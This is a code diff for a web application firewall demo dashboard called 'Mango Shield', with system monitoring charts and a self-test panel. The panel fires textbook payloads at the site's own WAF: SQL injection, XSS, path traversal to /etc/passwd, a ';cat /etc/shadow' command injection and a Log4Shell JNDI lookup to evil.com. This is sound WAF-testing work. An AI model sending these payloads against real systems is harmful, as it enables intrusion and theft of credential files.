+    cpuHist.push(cpuPct); if (cpuHist.length > 60) cpuHist.shift();
+
+    setText('sys_cpu', cpuPct + '%');
+    setText('sys_cpus', d.num_cpu + ' cores');
+    setProgress('sys_cpu_pct', 'sys_cpu_bar', cpuPct);
+
+    var ramPct = d.ram_total_mb > 0 ? Math.round(d.ram_used_mb / d.ram_total_mb * 100) : 0;
+    setText('sys_ram', ramPct + '%');
+    setText('sys_ram_detail', d.ram_used_mb + ' / ' + d.ram_total_mb + ' MB');
+    setProgress('sys_ram_pct', 'sys_ram_bar', ramPct);
+
+    var diskPct = Math.round(d.disk_used_pct || 0);
+    setText('sys_disk', diskPct + '%');
+    setText('sys_disk_detail', (d.disk_used_gb||0).toFixed(1) + ' / ' + (d.disk_total_gb||0).toFixed(1) + ' GB');
+    setProgress('sys_disk_pct2', 'sys_disk_bar', diskPct);
+
+    setText('sys_load', (d.load_1m||0).toFixed(2));
+    setText('sys_load_detail', (d.load_1m||0).toFixed(2) + ' / ' + (d.load_5m||0).toFixed(2) + ' / ' + (d.load_15m||0).toFixed(2));
+
+    // Network delta calculation
+    var rxDelta = prevRx > 0 ? d.net_rx_bytes - prevRx : 0;
+    var txDelta = prevTx > 0 ? d.net_tx_bytes - prevTx : 0;
+    prevRx = d.net_rx_bytes;
+    prevTx = d.net_tx_bytes;
+
+    setText('sys_rx', fmtBytes(d.net_rx_bytes || 0));
+    setText('sys_tx', fmtBytes(d.net_tx_bytes || 0));
+    setText('sys_tcp', fmt(d.tcp_connections || 0));
+    setText('sys_goroutines', fmt(d.goroutines || 0));
+
+    if (d.uptime_seconds) {
+      setText('sys_uptime_fmt', fmtUptime(d.uptime_seconds));
+    }
+
+    // CPU sparkline
+    drawLineChart('cpuChart', cpuHist, 'rgb(6,182,212)', 100);
+
+    // Stats chart (passed vs blocked)
+    fetch('/api/dstat').then(function(r){return r.json()}).then(function(sd) {
+      if (sd.hist_passed && sd.hist_blocked) {
+        drawLineChart('statsChart', sd.hist_passed, 'rgb(16,185,129)');
+      }
+    }).catch(function(){});
+
+  }).catch(function(){});
+}
+
+// ======================== HELPERS ========================
+function setText(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }
+function setProgress(labelId, barId, pct) {
+  pct = Math.max(0, Math.min(100, pct));
+  setText(labelId, pct + '%');
+  var bar = document.getElementById(barId);
+  if (bar) {
+    bar.style.width = pct + '%';
+    bar.className = 'prog-bar ' + pctClass(pct);
+  }
+}
+
+// ======================== ATTACK SIMULATION ========================
+var attacks = [
+  { name: 'SQL Injection', desc: 'OWASP A03 - Injection attack via query parameter', path: "/search?q=' OR 1=1--", danger: true },
+  { name: 'XSS Reflected', desc: 'OWASP A07 - Cross-site scripting via input field', path: '/search?q=<script>alert(1)<\/script>', danger: true },
+  { name: 'Path Traversal', desc: 'OWASP A01 - Broken access via directory traversal', path: '/../../etc/passwd', danger: true },
+  { name: 'Command Injection', desc: 'OS command injection via parameter', path: '/api?cmd=;cat /etc/shadow', danger: true },
+  { name: 'Log4Shell (CVE-2021-44228)', desc: 'JNDI lookup injection attempt', path: '/search?q=${jndi:ldap://evil.com/a}', danger: true },
+  { name: 'HTTP Smuggling', desc: 'Transfer-Encoding desync attempt', path: '/smuggle', danger: true },
+  { name: 'Normal GET Request', desc: 'Legitimate traffic - should pass WAF cleanly', path: '/', danger: false },
+  { name: 'Health Check', desc: 'API health probe - standard monitoring', path: '/api/dstat', danger: false },
+];
+
+function initAttackGrid() {
+  var grid = document.getElementById('attackGrid');
+  if (!grid) return;
+  grid.innerHTML = attacks.map(function(a, i) {
+    return '<div class="atk-item"><div class="atk-info"><div class="atk-name">' + a.name + '</div><div class="atk-desc">' + a.desc + '</div></div>' +
+      '<button class="atk-btn ' + (a.danger ? '' : 'safe') + '" onclick="runTest(' + i + ')">' + (a.danger ? 'Attack' : 'Test') + '</button></div>';
+  }).join('');
+}
+
+window.runTest = function(idx) {
+  var a = attacks[idx];
+  addLog(testLogs, 'testResults', 'Sending: ' + a.name + ' -> ' + a.path, '');
+  fetch(a.path, { redirect: 'manual' }).then(function(r) {
+    var status = r.status;
+    if (a.danger) {
+      if (status === 403 || status === 429 || status >= 400) {
+        addLog(testLogs, 'testResults', 'BLOCKED [' + status + '] - WAF correctly detected ' + a.name, 'warn');
+        toast('WAF blocked: ' + a.name, 'ok');
+      } else {
+        addLog(testLogs, 'testResults', 'PASSED [' + status + '] - WARNING: Attack not detected!', 'err');
+        toast('Warning: ' + a.name + ' not blocked', 'err');
+      }
+    } else {
+      if (status === 200) {
+        addLog(testLogs, 'testResults', 'OK [200] - ' + a.name + ' passed successfully', '');
+        toast(a.name + ' passed', 'ok');
+      } else {
+        addLog(testLogs, 'testResults', 'UNEXPECTED [' + status + '] - ' + a.name, 'warn');
+      }
+    }
+  }).catch(function(err) {
+    addLog(testLogs, 'testResults', 'ERROR - Network failure for ' + a.name + ': ' + err.message, 'err');
+  });
+};
+
+// ======================== INIT ========================
+initAttackGrid();
+addLog(secLogs, 'secLog', 'Security event log initialized', '');
+addLog(eventLogs, 'eventFeed', 'Mango Shield monitoring active', '');
+fetchStats();
+fetchSystemStats();
+setInterval(fetchStats, 1500);
+setInterval(fetchSystemStats, 2000);
+
+window.addEventListener('resize', function() {
+  drawLineChart('homeChart', homeRps, 'rgb(6,182,212)');
+  drawLineChart('cpuChart', cpuHist, 'rgb(6,182,212)', 100);
+});
+
+})();
+<\/script>
 </body>
 </html>`
-
-func main() {
-	go fetchMetrics()
-
-	http.HandleFunc("/api/stats", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/json")
-		w.Header().Set("Access-Control-Allow-Origin", "*")
-
-		data := lastJSON.Load()
-		if data != nil {
-			if bytesData, ok := data.([]byte); ok && len(bytesData) > 0 {
-				w.Write(bytesData)
-				return
-			}
-		}
-
-		fallback := StatsResponse{
-			Status:      "healthy",
-			Uptime:      "Active",
-			HistPassed:  histPassed,
-			HistBlocked: histBlocked,
-		}
-		json.NewEncoder(w).Encode(fallback)
-	})
-
-	http.HandleFunc("/assets/chart.js", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/javascript")
-		w.Header().Set("Cache-Control", "public, max-age=86400")
-		w.Write([]byte("!function(t,e){\"object\"==typeof exports&&\"undefined\"!=typeof module?module.exports=e():\"function\"==typeof define&&define.amd?define(e):(t=\"undefined\"!=typeof globalThis?globalThis:t||self).Chart=e()}(this,(function(){\"use strict\";return function(t,e){return{type:e.type,data:e.data,options:e.options,update:function(){},getContext:function(){return t}}}}));"))
-	})
-
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/html; charset=utf-8")
-		w.Write([]byte(htmlPage))
-	})
-
-	fmt.Println("Mango Shield Production Demo & Test Site listening on :8080")
-	if err := http.ListenAndServe(":8080", nil); err != nil {
-		fmt.Printf("Server error: %v\n", err)
-	}
-}
